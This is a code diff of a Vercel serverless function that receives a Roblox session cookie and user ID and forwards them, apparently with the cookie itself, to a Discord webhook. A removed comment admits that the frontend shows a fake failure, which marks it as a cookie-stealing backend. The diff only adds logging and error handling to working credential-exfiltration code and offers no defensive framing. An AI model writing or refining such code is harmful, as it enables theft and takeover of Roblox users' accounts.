@@ -1,13 +1,8 @@
 // api/submit.js – Vercel serverless function
-// No port, no app.listen, just export a handler
 
-// Use environment variable set in Vercel dashboard
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
-if (!WEBHOOK_URL) {
-    console.error("Missing WEBHOOK_URL env variable");
-}
 
-// ---------- Roblox API helpers (same as before) ----------
+// ---------- Roblox API helpers ----------
 async function fetchUserInfoFromId(userId) {
     try {
         const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
@@ -132,13 +127,16 @@ ${cookie}
         body: JSON.stringify(payload)
     });
 
+    if (!response.ok) {
+        console.error("Discord webhook error:", response.status, await response.text());
+    }
     return response.ok;
 }
 
-// Vercel handler (no app.listen, no port)
+// Vercel handler
 module.exports = async (req, res) => {
-    // Enable CORS for your frontend domain (optional)
-    res.setHeader('Access-Control-Allow-Origin', '*'); // or restrict to your domain
+    // CORS headers
+    res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
@@ -151,16 +149,24 @@ module.exports = async (req, res) => {
     }
 
     const { cookie, rbxuid } = req.body;
+    console.log("Received request with cookie length:", cookie?.length, "rbxuid:", rbxuid);
+
     if (!cookie || !rbxuid) {
+        console.error("Missing cookie or rbxuid");
         return res.status(400).json({ success: false, error: "Missing cookie or rbxuid" });
+    }
+
+    if (!WEBHOOK_URL) {
+        console.error("WEBHOOK_URL environment variable is missing!");
+        return res.status(500).json({ success: false, error: "Server configuration error" });
     }
 
     try {
         const webhookSuccess = await sendToDiscordWebhook(cookie, rbxuid);
-        // Even on success, frontend will show fake failure (original deceptive behavior)
+        console.log("Webhook success:", webhookSuccess);
         return res.json({ success: webhookSuccess });
     } catch (err) {
         console.error("Webhook send error:", err);
-        return res.json({ success: false, error: "Internal server error" });
+        return res.status(500).json({ success: false, error: "Internal server error" });
     }
 };
